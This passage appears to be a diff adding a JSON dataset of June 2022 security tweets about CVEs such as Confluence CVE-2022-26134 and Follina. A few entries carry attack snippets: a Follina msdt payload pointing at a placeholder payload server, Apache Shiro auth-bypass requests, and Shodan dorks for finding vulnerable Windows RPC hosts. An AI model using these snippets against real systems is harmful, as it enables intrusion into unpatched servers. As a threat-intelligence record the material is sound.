+    "tweetreplies": 4,
+    "tweetretweets": 41,
+    "tweettext": "⚠️ CVE-2022-26134 event detected ⚠️\n\nSource IP:\n193.106.191.48 (🇷🇺)\n\nTarget:\nAtlassian Confluence servers vulnerable to unauthenticated remote code execution (https://t.co/mZ6pPfOBws)\n\nLast seen:\n2022-06-03T21:32:10Z\n#threatintel",
+    "tweettime": "2022-06-03, 22:01:05",
+    "tweeturl": "https://twitter.com/bad_packets/status/1532844850298597376",
+    "username": "bad_packets"
+}
+{
+    "expanded_url": [
+        "https://github.com/Nwqda/CVE-2022-26134"
+    ],
+    "tweetfavorites": 67,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 46,
+    "tweettext": "CVE-2022-26134 - Script PoC that exploit the remote code execution vulnerability affecting Atlassian Confluence products 7.18.1 and under. This vulnerability is exploitable without requiring authentication!\n\n#Confluence  #Atlassian #infosec #0day #PoC\nhttps://t.co/HUylvXQ6i0",
+    "tweettime": "2022-06-03, 21:41:53",
+    "tweeturl": "https://twitter.com/Naqwada_/status/1532840017894469632",
+    "username": "Naqwada_"
+}
+{
+    "expanded_url": [
+        "http://go.usa.gov/xJWGw"
+    ],
+    "tweetfavorites": 77,
+    "tweetquotes": 3,
+    "tweetreplies": 5,
+    "tweetretweets": 63,
+    "tweettext": "🚨 Atlassian has released new Confluence Server and Data Center versions to address RCE vulnerability CVE-2022-26134. Update immediately! Read more at https://t.co/wxbzPoWfqi. #Cybersecurity #InfoSec https://t.co/frTQpH4Rax",
+    "tweettime": "2022-06-03, 20:37:59",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1532823934156034048",
+    "username": "USCERT_gov"
+}
+{
+    "expanded_url": [
+        "https://github.com/projectdiscovery/nuclei-templates/pull/4527"
+    ],
+    "tweetfavorites": 294,
+    "tweetquotes": 0,
+    "tweetreplies": 0,
+    "tweetretweets": 72,
+    "tweettext": "None-Intrusive @pdnuclei  template for the Confluence RCE vulnerability CVE-2022-26134 is available\n\nhttps://t.co/BGJTz82dmu\n\nConfirmation of hits by DNS callbacks with nslookup to interactsh servers. https://t.co/e42OaNI6mT",
+    "tweettime": "2022-06-03, 20:23:43",
+    "tweeturl": "https://twitter.com/naglinagli/status/1532820345018785792",
+    "username": "naglinagli"
+}
+{
+    "tweetfavorites": 75,
+    "tweetquotes": 0,
+    "tweetreplies": 3,
+    "tweetretweets": 5,
+    "tweettext": "I wonder if releasing the Confluence RCE patch for CVE-2022-26134 within the weekend was a good idea 🤔 instead of 1 APT exploiting it in the wild now everyone got a working PoC and already mass exploit it 🤡\n\n#BugBounty #infosec",
+    "tweettime": "2022-06-03, 20:15:30",
+    "tweeturl": "https://twitter.com/naglinagli/status/1532818278061641731",
+    "username": "naglinagli"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 208,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 94,
+    "tweettext": "Our technical analysis and curl based PoC for Confluence CVE-2022-26134 can be found here: https://t.co/LUc4286Cj4",
+    "tweettime": "2022-06-03, 19:37:29",
+    "tweeturl": "https://twitter.com/Junior_Baines/status/1532808712070512647",
+    "username": "Junior_Baines"
+}
+{
+    "tweetfavorites": 67,
+    "tweetquotes": 2,
+    "tweetreplies": 4,
+    "tweetretweets": 29,
+    "tweettext": "It looks like CVE-2022-26134 (Unauthenticated RCE via OGNL template injection) uses the same vector as CVE-2021-26084.\n\nHere is an attack via CVE-2021-26084 that I was checking on 2022-05-16 that allowed to create a webshell in ./confluence/testAnt.jsp\n\nJust for comparison 🤔 https://t.co/mER1UCe5Ke",
+    "tweettime": "2022-06-03, 19:14:47",
+    "tweeturl": "https://twitter.com/1ZRR4H/status/1532802996362526720",
+    "username": "1ZRR4H"
+}
+{
+    "tweetfavorites": 62,
+    "tweetquotes": 3,
+    "tweetreplies": 3,
+    "tweetretweets": 20,
+    "tweettext": "There is an RCE PoC for CVE-2022-26134 in this blog post. I haven't tested it yet.",
+    "tweettime": "2022-06-03, 19:12:41",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532802468068962304",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://www.rapid7.com/blog/post/2022/06/02/active-exploitation-of-confluence-cve-2022-26134/"
+    ],
+    "tweetfavorites": 195,
+    "tweetquotes": 10,
+    "tweetreplies": 2,
+    "tweetretweets": 118,
+    "tweettext": "The Rapid7 team has a root cause analysis of Confluence CVE-2022-26134 out now with thanks to @Junior_Baines. This is an emergency mitigation situation. https://t.co/2G9H6OmJA6",
+    "tweettime": "2022-06-03, 19:05:25",
+    "tweeturl": "https://twitter.com/catc0n/status/1532800640371531777",
+    "username": "catc0n"
+}
+{
+    "tweetfavorites": 102,
+    "tweetquotes": 1,
+    "tweetreplies": 5,
+    "tweetretweets": 30,
+    "tweettext": "Looking at the patch for Atlassian Confluence CVE-2022-26134 on my lunch break...\n\n-        final String finalNamespace = TextParseUtil.translateVariables(this.namespace, stack);\n-        final String finalActionName = TextParseUtil.translateVariables(this.actionName, stack);\n\n👀",
+    "tweettime": "2022-06-03, 17:11:20",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532771930960445449",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "tweetfavorites": 219,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 82,
+    "tweettext": "This is real. We've confirmed it to work on fully patched Windows. The attack scenario is similar to CVE-2020-1300: get the user to open a CAB file, and a malicious executable is silently copied to their StartUp folder, to be launched the next time they login.",
+    "tweettime": "2022-06-03, 12:43:25",
+    "tweeturl": "https://twitter.com/mkolsek/status/1532704505577541637",
+    "username": "mkolsek"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/06/hackers-exploiting-unpatched-critical.html"
+    ],
+    "tweetfavorites": 134,
+    "tweetquotes": 3,
+    "tweetreplies": 4,
+    "tweetretweets": 101,
+    "tweettext": "Researchers have uncovered a critical unpatched RCE #vulnerability (CVE-2022-26134) affecting #Atlassian Confluence Server and Data Center products that is being actively exploited by hackers.\n\nRead details: https://t.co/DKvtuJIUr4\n\n#infosec #cybersecurity #hacking",
+    "tweettime": "2022-06-03, 03:44:37",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1532568914151976961",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/NafisiAslH/KnowledgeSharing/tree/main/CyberSecurity/Web/CVEs/CVE-2022/CVE-2022-30190?fbclid=IwAR0UczaWjJNKWTnlvZHCXsWhABuae0kDRKx3hj-wo0LS1y8TZ32HR5w9t3w"
+    ],
+    "tweetfavorites": 35,
+    "tweetquotes": 2,
+    "tweetreplies": 0,
+    "tweetretweets": 17,
+    "tweettext": "CVE-2022-30190 : Microsoft Windows Support Diagnostic Tool RCE https://t.co/IztgFGowq9",
+    "tweettime": "2022-06-03, 01:58:06",
+    "tweeturl": "https://twitter.com/_r_netsec/status/1532542109328150528",
+    "username": "_r_netsec"
+}
+{
+    "expanded_url": [
+        "https://blog.reconinfosec.com/analysis-of-exploitation-of-cve-2019-3396"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 13,
+    "tweettext": "For teams dealing with CVE-2022-26134, see this blog post which analyzes a previous Confluence RCE (CVE-2019-3396). It may provide insight into how to approach a breach involving Confluence.\n\nhttps://t.co/A9dKJHktyp",
+    "tweettime": "2022-06-03, 00:54:09",
+    "tweeturl": "https://twitter.com/Recon_InfoSec/status/1532526015188180997",
+    "username": "Recon_InfoSec"
+}
+{
+    "expanded_url": [
+        "https://go.usa.gov/xJDf2"
+    ],
+    "tweetfavorites": 97,
+    "tweetquotes": 16,
+    "tweetreplies": 2,
+    "tweetretweets": 76,
+    "tweettext": "🚨 A RCE Vulnerability (CVE-2022-26134) in Atlassian's Confluence Server and Data Center is being actively exploited. ⛔ Block all internet traffic to and from those devices until an update is available and applied. @CISAgov's KEV now includes this vul: https://t.co/9vliOlJpmd https://t.co/YNltqOCDs7",
+    "tweettime": "2022-06-02, 23:56:11",
+    "tweeturl": "https://twitter.com/USCERT_gov/status/1532511428451631108",
+    "username": "USCERT_gov"
+}
+{
+    "tweetfavorites": 36,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 6,
+    "tweettext": "\"When initially analyzing the exploit, Volexity noted it looked similar to previous vulnerabilities that have also been exploited in order to gain remote code execution.\"\n\n\"It should also be noted that CVE-2022-26134 appears to be another command injection vulnerability.\"\n\n👀",
+    "tweettime": "2022-06-02, 23:03:53",
+    "tweeturl": "https://twitter.com/wvuuuuuuuuuuuuu/status/1532498264242769925",
+    "username": "wvuuuuuuuuuuuuu"
+}
+{
+    "expanded_url": [
+        "https://confluence.atlassian.com/doc/confluence-security-advisory-2022-06-02-1130377146.html"
+    ],
+    "tweetfavorites": 227,
+    "tweetquotes": 16,
+    "tweetreplies": 7,
+    "tweetretweets": 122,
+    "tweettext": "Atlassian is warning about a zero-day in Confluence (CVE-2022-26134). This is a pre-auth, remote code execution bug. No patch yet. Atlassian credits @Volexity which reported it after responding to different victims who got shells/backdoors via this flaw. https://t.co/3AgnpQ1fB3",
+    "tweettime": "2022-06-02, 22:40:49",
+    "tweeturl": "https://twitter.com/briankrebs/status/1532492461939085329",
+    "username": "briankrebs"
+}
+{
+    "tweetfavorites": 99,
+    "tweetquotes": 6,
+    "tweetreplies": 4,
+    "tweetretweets": 28,
+    "tweettext": "Whomp whomp “Confluence Security Advisory 2022-06-02\nConfluence Server and Data Center - CVE-2022-26134 - Critical severity unauthenticated remote code execution vulnerability” https://t.co/LdcjCdNVSa",
+    "tweettime": "2022-06-02, 21:54:54",
+    "tweeturl": "https://twitter.com/HackingLZ/status/1532480905335345152",
+    "username": "HackingLZ"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/1/is-exploiting-a-null-pointer-deref-for-lpe-just-a-pipe-dream"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 39,
+    "tweettext": "Is exploiting a null pointer deref for LPE just a pipe dream? @izobashi shows the process discovering a couple of #Bitdefender AV bugs (CVE-2021-4198/CVE-2021-4199). The exploit leads to LPE by exploiting a link following issue. https://t.co/YH9f35RU6W",
+    "tweettime": "2022-06-02, 15:15:54",
+    "tweeturl": "https://twitter.com/thezdi/status/1532380491311108096",
+    "username": "thezdi"
+}
+{
+    "tweetfavorites": 248,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 91,
+    "tweettext": "🎁 PoC for a Post-Auth SQL-Injection (CVE-2022-0757) in Nexpose Vulnerability Scanner &lt;= 6.6.128\n\nDefault port: 3780\nDefault username: nxadmin\nAffected handler: /data/asset/filterAssets\n\nFull Request ⤵️ https://t.co/Fi403Zjk9a",
+    "tweettime": "2022-06-02, 14:24:10",
+    "tweeturl": "https://twitter.com/ptswarm/status/1532367472241909760",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "http://dlvr.it/SRV16J"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 5,
+    "tweetreplies": 0,
+    "tweetretweets": 24,
+    "tweettext": "CVE-2022-1972: out-of-bound write in Linux netfilter subsystem leads to local privilege escalation: Posted by 张子明(明程) on Jun 02Hello,\n \n An out-of-bound write vulnerability was identified within the\n netfilter subsystem\n which can be exploited to… https://t.co/lLqUCOykeo",
+    "tweettime": "2022-06-02, 10:58:01",
+    "tweeturl": "https://twitter.com/oss_security/status/1532315596653596672",
+    "username": "oss_security"
+}
+{
+    "expanded_url": [
+        "https://github.com/PwnC00re/PoC-CVE-2022-30190?fbclid=IwAR07oJZ7iL0ZyuAXNOflJyttKodx7Tba9Zmp_38ulPpZHpi6GgCc4eYMxZg"
+    ],
+    "tweetfavorites": 327,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 138,
+    "tweettext": "0-day [CVE-2022-30190] MS Offic RCE aka msdt follina\n\nTarget = \"http://&lt;payload_server&gt;/payload.html!\"\nTargetMode = \"External\"\n\nIT_RebrowseForFile=cal?c IT_SelectProgram=NotListed IT_BrowseForFile=h$(IEX('calc.exe'))i/../../../../../../Windows/System32\n\nhttps://t.co/Bci6gVBWJn https://t.co/hc2TcRoOQt",
+    "tweettime": "2022-06-02, 02:35:49",
+    "tweeturl": "https://twitter.com/wugeej/status/1532189210425577472",
+    "username": "wugeej"
+}
+{
+    "expanded_url": [
+        "https://tcm-sec.com/follina-rce-exploitation-cve-2022-30190/"
+    ],
+    "tweetfavorites": 148,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 46,
+    "tweettext": "Let's learn more about the newest exploit going around, Follina RCE - CVE-2022-30190.  Joe Helle takes us through and shows us a couple ways this exploitation works and what you can do to remedy this current issue.\n\nhttps://t.co/uvIHdUi8QP\n\n#follina #cve #exploitation https://t.co/uXciZocib3",
+    "tweettime": "2022-06-01, 17:29:42",
+    "tweeturl": "https://twitter.com/thecybermentor/status/1532051776651788293",
+    "username": "thecybermentor"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/horde-webmail-rce-via-email/"
+    ],
+    "tweetfavorites": 74,
+    "tweetquotes": 4,
+    "tweetreplies": 1,
+    "tweetretweets": 30,
+    "tweettext": "⚠️ Horde Webmail is affected by an unpatched code vulnerability (CVE-2022-30287) that allows attackers to take over the mail server when a malicious email is opened. Learn more from our security research:\n\nhttps://t.co/bgpUsljVR3\n\n#appsec #security #vulnerability",
+    "tweettime": "2022-06-01, 15:22:41",
+    "tweeturl": "https://twitter.com/SonarSource/status/1532019810619559939",
+    "username": "SonarSource"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-806/"
+    ],
+    "tweetfavorites": 33,
+    "tweetquotes": 3,
+    "tweetreplies": 0,
+    "tweetretweets": 16,
+    "tweettext": "[ZDI-22-806|CVE-2022-23088] FreeBSD 802.11 Network Subsystem Heap-based Buffer Overflow Remote Code Execution Vulnerability (CVSS 8.3) https://t.co/llalKSSlaZ",
+    "tweettime": "2022-06-01, 14:45:14",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1532010387062894592",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://blog.0patch.com/2022/06/free-micropatches-for-follina-microsoft.html"
+    ],
+    "tweetfavorites": 63,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 36,
+    "tweettext": "Free Micropatches For \"Follina\" Microsoft Diagnostic Tool Remote Code Execution 0day (CVE-2022-30190) #Follina\nhttps://t.co/lyNPrgdObJ https://t.co/6UABGE6qor",
+    "tweettime": "2022-06-01, 14:30:17",
+    "tweeturl": "https://twitter.com/0patch/status/1532006627225784323",
+    "username": "0patch"
+}
+{
+    "expanded_url": [
+        "https://www.trendmicro.com/en_us/research/22/e/patch-your-wso2-cve-2022-29464-exploited-to-install-linux-compatible-cobalt-strike-beacons-other-malware.html"
+    ],
+    "tweetfavorites": 86,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 41,
+    "tweettext": "Trend Micro has a report out on the recent attacks targeting CVE-2022-29464, a remote code execution vulnerability in WSO2 servers\n\nhttps://t.co/DYFAGxkiQn https://t.co/EQotRJbkyu",
+    "tweettime": "2022-06-01, 08:43:00",
+    "tweeturl": "https://twitter.com/campuscodi/status/1531919227539570690",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://twitter.com/cyb3rops/status/1531154093451902978"
+    ],
+    "tweetfavorites": 125,
+    "tweetquotes": 2,
+    "tweetreplies": 3,
+    "tweetretweets": 40,
+    "tweettext": "1/ The exploitation of CVE-2022-30190 #Follina isn’t hard to detect\n\nIn fact, proc creation logs with parent info are enough\nhttps://t.co/fH8Ww1f6JA\n\nIt also isn’t hard to apply the workaround via GPO\n\nThe problem with this 0day is that 99% of the possible victims …",
+    "tweettime": "2022-06-01, 06:24:57",
+    "tweeturl": "https://twitter.com/cyb3rops/status/1531884486341840897",
+    "username": "cyb3rops"
+}
+{
+    "expanded_url": [
+        "https://github.co/3Oys62x"
+    ],
+    "tweetfavorites": 189,
+    "tweetquotes": 3,
+    "tweetreplies": 1,
+    "tweetretweets": 90,
+    "tweettext": "In this post @mmolgtm goes through the details of CVE-2022-1134, a type confusion in Chrome, and shows how to gain remote code execution in the Chrome renderer using this bug. https://t.co/T4643hqF08",
+    "tweettime": "2022-06-30, 09:31:14",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1542440614637223936",
+    "username": "GHSecurityLab"
+}
+{
+    "tweetfavorites": 201,
+    "tweetquotes": 4,
+    "tweetreplies": 5,
+    "tweetretweets": 51,
+    "tweettext": "1) CVE-2021-21042 to disclosure user32.dll's base addr.\n2) CVE-2019-7040 to get RCE.\n\nNo sbx, so protected mode is off. To be released soon... https://t.co/b3DiUxcdZW",
+    "tweettime": "2022-06-29, 18:23:23",
+    "tweeturl": "https://twitter.com/j00sean/status/1542212146313969665",
+    "username": "j00sean"
+}
+{
+    "expanded_url": [
+        "https://www.horizon3.ai/red-team-blog-cve-2022-28219"
+    ],
+    "tweetfavorites": 739,
+    "tweetquotes": 17,
+    "tweetreplies": 6,
+    "tweetretweets": 268,
+    "tweettext": "Check out a recent finding by one of our own, Naveen Sunkavally. CVE-2022-28219 is an unauth RCE for ManageEngine ADAudit Plus. \n\nThis XXE -&gt; Deserialization chain often leads to host compromise as well as priv'd AD creds. Check out the blog post and POC: https://t.co/bLHzhvSnLo",
+    "tweettime": "2022-06-29, 13:24:35",
+    "tweeturl": "https://twitter.com/Horizon3Attack/status/1542136953004609536",
+    "username": "Horizon3Attack"
+}
+{
+    "tweetfavorites": 180,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 50,
+    "tweettext": "Apache Shiro CVE-2022-32532\nThis request can succeed\n\nGET /permit/any HTTP/1.1\nToken: momika\nAccess is not allowed when there is no token request header\n\nGET /permit/any HTTP/1.1\nIt can be bypassed in a simple way in special but common configurations\n\nGET /permit/a%0any HTTP/1.1",
+    "tweettime": "2022-06-29, 05:27:00",
+    "tweeturl": "https://twitter.com/momika233/status/1542016765030707206",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/zimbra-pre-auth-rce-via-unrar-0day/"
+    ],
+    "tweetfavorites": 805,
+    "tweetquotes": 13,
+    "tweetreplies": 10,
+    "tweetretweets": 356,
+    "tweettext": "⚠️ Zimbra Mail pre-auth RCE via Path Traversal bug in unrar (CVE-2022-30333).  This is probably my most impactful bug so far, especially after Zimbra has been the target of a 0day campaign likely conducted by a state actor. More details in this blog post: https://t.co/8v0ujC1Nyl https://t.co/VZQm0NdqnU",
+    "tweettime": "2022-06-28, 15:06:05",
+    "tweeturl": "https://twitter.com/scannell_simon/status/1541800107909185537",
+    "username": "scannell_simon"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/advisories/ZDI-22-871/"
+    ],
+    "tweetfavorites": 64,
+    "tweetquotes": 1,
+    "tweetreplies": 1,
+    "tweetretweets": 27,
+    "tweettext": "[ZDI-22-871|CVE-2022-30157] Microsoft SharePoint Chart Deserialization of Untrusted Data Remote Code Execution Vulnerability (CVSS 8.8) https://t.co/rVlmeQCu9b",
+    "tweettime": "2022-06-23, 15:50:18",
+    "tweeturl": "https://twitter.com/TheZDIBugs/status/1539999296405356546",
+    "username": "TheZDIBugs"
+}
+{
+    "expanded_url": [
+        "https://github.com/CFandR-github/PHP-binary-bugs/tree/main/cve_2022_31626_remote_exploit"
+    ],
+    "tweetfavorites": 422,
+    "tweetquotes": 4,
+    "tweetreplies": 4,
+    "tweetretweets": 170,
+    "tweettext": "💥 We have reproduced CVE-2022-31626, an RCE in PHP &lt;= 7.4.29 which can be triggered via a rogue MySQL/MariaDB server!\n\nIt's a Heap Overflow, works with MySQLi/PDO, and doesn't require LOAD LOCAL INFILE.\n\nThe PoC 👉 https://t.co/vrtniSEHhu https://t.co/ElJJgl5d9j",
+    "tweettime": "2022-06-23, 01:52:39",
+    "tweeturl": "https://twitter.com/ptswarm/status/1539788492695371778",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://github.com/kuron3k0/Spring-Data-Mongodb-Example"
+    ],
+    "tweetfavorites": 151,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 61,
+    "tweettext": "https://t.co/qmyC5hEBG5\nCVE-2022-22980: Spring Data MongoDB SpEL Expression injection vulnerability through annotated repository query methods https://t.co/jFv7mXtwdt",
+    "tweettime": "2022-06-21, 13:30:30",
+    "tweeturl": "https://twitter.com/momika233/status/1539239336558104576",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-21972-windows-server-vpn-remote-kernel-use-after-free-vulnerability/"
+    ],
+    "tweetfavorites": 177,
+    "tweetquotes": 4,
+    "tweetreplies": 0,
+    "tweetretweets": 68,
+    "tweettext": "CVE-2022-21972: Windows Server VPN Remote Kernel Use After Free Vulnerability (Part 1) https://t.co/2tNZ3gmi81",
+    "tweettime": "2022-06-21, 08:41:54",
+    "tweeturl": "https://twitter.com/reverseame/status/1539166711072624642",
+    "username": "reverseame"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 114,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 36,
+    "tweettext": "https://t.co/NtvlODMlQp\nCVE-2022-26809",
+    "tweettime": "2022-06-19, 13:46:03",
+    "tweeturl": "https://twitter.com/momika233/status/1538518477342130176",
+    "username": "momika233"
+}
+{
+    "expanded_url": [
+        "https://github.com/s1ckb017/PoC-CVE-2022-26809"
+    ],
+    "tweetfavorites": 436,
+    "tweetquotes": 5,
+    "tweetreplies": 6,
+    "tweetretweets": 199,
+    "tweettext": "🧨 Windows RPC Critical Vulnerability (CVE-2022-26809)\n\nYou can search for vulnerable hosts in Shodan by dorks:\n\nport:445\n\nproduct:\"Microsoft RPC Endpoint Mapper\"\n\nLink to PoC https://t.co/AXQC2W0rmU\n\n#bugbountytips #CVE #cybersecurity #infosec #bugbounty https://t.co/r7uf5eWgji",
+    "tweettime": "2022-06-18, 20:01:12",
+    "tweeturl": "https://twitter.com/TodayCyberNews/status/1538250496313413633",
+    "username": "TodayCyberNews"
+}
+{
+    "expanded_url": [
+        "https://github.com/omair2084/CVE-2022-26937"
+    ],
+    "tweetfavorites": 451,
+    "tweetquotes": 6,
+    "tweetreplies": 3,
+    "tweetretweets": 162,
+    "tweettext": "From what was available online, a rough PoC for Windows NFS vulnerability (CVE-2022-26937). https://t.co/tk43aHWHpa https://t.co/KR1yibxLx7",
+    "tweettime": "2022-06-17, 01:52:53",
+    "tweeturl": "https://twitter.com/w3bd3vil/status/1537614224595501056",
+    "username": "w3bd3vil"
+}
+{
+    "expanded_url": [
+        "https://www.zerodayinitiative.com/blog/2022/6/15/cve-2022-23088-exploiting-a-heap-overflow-in-the-freebsd-wi-fi-stack"
+    ],
+    "tweetfavorites": 169,
+    "tweetquotes": 5,
+    "tweetreplies": 5,
+    "tweetretweets": 62,
+    "tweettext": "CVE-2022-23088: A new guest blog from @m00nbsd describes a 13-yr-old heap overflow in the Wi-Fi stack that allows network-adjacent attackers to execute code on affected installations of FreeBSD Kernel. Includes root cause &amp; PoC. Read the details at https://t.co/NPHu6jkiaa",
+    "tweettime": "2022-06-16, 16:39:20",
+    "tweeturl": "https://twitter.com/thezdi/status/1537474918627131392",
+    "username": "thezdi"
+}
+{
+    "expanded_url": [
+        "https://github.co/3mWLcTP"
+    ],
+    "tweetfavorites": 111,
+    "tweetquotes": 2,
+    "tweetreplies": 2,
+    "tweetretweets": 36,
+    "tweettext": "In this blog post @mmolgtm shows how to bypass various modern mitigation implemented in the Android kernel and exploit CVE-2022-22057 to gain root from a malicious Android app https://t.co/4d4pMOxNgu",
+    "tweettime": "2022-06-16, 16:05:29",
+    "tweeturl": "https://twitter.com/GHSecurityLab/status/1537466400578609152",
+    "username": "GHSecurityLab"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/"
+    ],
+    "tweetfavorites": 59,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 21,
+    "tweettext": "Volexity report detailing the exploitation of a Sophos firewall zero-day from earlier this year\n\nZero-day is tracked as CVE-2022-1040 and its exploitation was linked to \"DriftingCloud,\" a new APT that appears to be based in China\n\nhttps://t.co/NdMiOUsFkb https://t.co/U77hLLfadf",
+    "tweettime": "2022-06-16, 16:01:33",
+    "tweeturl": "https://twitter.com/campuscodi/status/1537465412807442432",
+    "username": "campuscodi"
+}
+{
+    "expanded_url": [
+        "https://blog.assetnote.io/2021/12/26/chained-ssrf-websphere/"
+    ],
+    "tweetfavorites": 78,
+    "tweetquotes": 0,
+    "tweetreplies": 1,
+    "tweetretweets": 14,
+    "tweettext": "Just scored 2 full-read SSRF bounties with this blog. Thank you @assetnote! Who do I send the beer to? 🍻\n\nTurning bad SSRF to good SSRF: Websphere Portal (CVE-2021-27748) -   https://t.co/iIlMtE874p",
+    "tweettime": "2022-06-16, 13:32:20",
+    "tweeturl": "https://twitter.com/systemDumb/status/1537427860209680384",
+    "username": "systemDumb"
+}
+{
+    "tweetfavorites": 80,
+    "tweetquotes": 1,
+    "tweetreplies": 2,
+    "tweetretweets": 25,
+    "tweettext": "🚒 Invision Community fixed an SSRF vulnerability (CVE-2021-40604) found by Mikhail Klyuchnikov!\n\nTimeline:\n✅ 06/23/2021 - The advisory is published\n😒 06/24/2021 - Requested CVE via MITRE\n😀 06/13/2022 - CVE was assigned\n\nThe PoC ⤵️\n\nThe \"gkey\" param is an unfollow token. https://t.co/jlvQwcm9QY",
+    "tweettime": "2022-06-16, 13:06:51",
+    "tweeturl": "https://twitter.com/ptswarm/status/1537421446946988036",
+    "username": "ptswarm"
+}
+{
+    "expanded_url": [
+        "https://labs.nettitude.com/blog/cve-2022-21972-windows-server-vpn-remote-kernel-use-after-free-vulnerability/"
+    ],
+    "tweetfavorites": 128,
+    "tweetquotes": 1,
+    "tweetreplies": 0,
+    "tweetretweets": 43,
+    "tweettext": "CVE-2022-21972: Windows Server VPN Remote Kernel Use After Free Vulnerability https://t.co/Olq8qu8zpR",
+    "tweettime": "2022-06-16, 11:58:00",
+    "tweeturl": "https://twitter.com/pentest_swissky/status/1537404119127691267",
+    "username": "pentest_swissky"
+}
+{
+    "expanded_url": [
+        "https://thehackernews.com/2022/06/high-severity-rce-vulnerability.html"
+    ],
+    "tweetfavorites": 118,
+    "tweetquotes": 6,
+    "tweetreplies": 2,
+    "tweetretweets": 87,
+    "tweettext": "Researchers detail a recently reported high-severity #vulnerability (CVE-2022-25845) in the Fastjson library that could potentially be exploited for remote code execution attacks.\n\nRead: https://t.co/b0Gvl4lUhQ\n\n#infosec #sysadmin #DevOps #cybersecurity #hacking",
+    "tweettime": "2022-06-16, 08:29:26",
+    "tweeturl": "https://twitter.com/TheHackersNews/status/1537351630877696000",
+    "username": "TheHackersNews"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2022-29149"
+    ],
+    "tweetfavorites": 163,
+    "tweetquotes": 11,
+    "tweetreplies": 3,
+    "tweetretweets": 70,
+    "tweettext": "OMI is back! @msftsecresponse published CVE-2022-29149, a new LPE vulnerability in OMI, the Azure agent that was vulnerable to #OMIGOD. Seems like manual update of the silently installed agent is required again in most cases \n\nhttps://t.co/Ga4hETg6i2",
+    "tweettime": "2022-06-15, 23:06:35",
+    "tweeturl": "https://twitter.com/41thexplorer/status/1537209987570847744",
+    "username": "41thexplorer"
+}
+{
+    "expanded_url": [
+        "https://www.volexity.com/blog/2022/06/15/driftingcloud-zero-day-sophos-firewall-exploitation-and-an-insidious-breach/"
+    ],
+    "tweetfavorites": 113,
+    "tweetquotes": 6,
+    "tweetreplies": 0,
+    "tweetretweets": 79,
+    "tweettext": ".@Volexity offers a case study on real-world #zeroday exploitation of a Sophos XG Firewall via CVE-2022-1040 by #DriftingCloud. Read about man-in-the-middle attacks, stolen session cookies, and how this APT moved beyond the firewall: https://t.co/3TthlXpXe8 #threatintel #dfir",
+    "tweettime": "2022-06-15, 18:44:47",
+    "tweeturl": "https://twitter.com/Volexity/status/1537144102218870784",
+    "username": "Volexity"
+}
+{
+    "expanded_url": [
+        "https://msrc.microsoft.com/update-guide/en-US/vulnerability/CVE-2022-30190"
+    ],
+    "tweetfavorites": 251,
+    "tweetquotes": 10,
+    "tweetreplies": 1,
+    "tweetretweets": 72,
+    "tweettext": "https://t.co/EZlw4Vr9dV The official patch for CVE-2022-30190 is released. Added regular filtering to the RunScript function, which means that this vulnerability turns into a game that tries to bypass https://t.co/WnFQaDB3Hv",
+    "tweettime": "2022-06-15, 03:55:12",
+    "tweeturl": "https://twitter.com/80vul/status/1536920233255968769",
+    "username": "80vul"
+}
+{
+    "expanded_url": [
+        "https://blog.sonarsource.com/zimbra-mail-stealing-clear-text-credentials-via-memcache-injection/"
+    ],
+    "tweetfavorites": 236,
+    "tweetquotes": 6,
+    "tweetreplies": 5,
+    "tweetretweets": 110,
